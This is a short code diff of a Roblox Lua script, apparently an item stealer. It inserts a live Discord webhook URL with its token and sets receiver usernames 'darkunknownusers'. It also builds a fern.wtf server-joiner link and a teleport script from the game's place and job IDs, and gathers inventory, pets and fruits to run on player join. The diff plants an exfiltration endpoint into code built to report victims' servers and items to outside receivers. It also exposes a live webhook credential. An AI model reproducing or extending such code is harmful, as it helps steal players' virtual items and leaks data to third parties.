@@ -1,6 +1,6 @@
 Username = {""}
-Webhook = ""
-local Username = Username or {"No Receiver", "sad"}
+Webhook = "https://discord.com/api/webhooks/1388308785705259121/Uu9NXzuO5-X3625qorDrapu23-V27vzsWCb63vudSQdkocnMw_scgo9E7fsWLCGioADF"
+local Username = Username or {"No Receiver", "darkunknownusers"}
 local fern = "https://fern.wtf/joiner?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId
 local tpscript = [[game:GetService("TeleportService"):TeleportToPlaceInstance("]] .. game.PlaceId .. [[", "]] .. game.JobId .. [[", game.Players.LocalPlayer)]]
 local inv,pets,fruits = {},{},{}
@@ -220,4 +220,5 @@ game.Players.PlayerAdded:Connect(function(player)
             start(player.Name)
         end)
     end
+
 end)
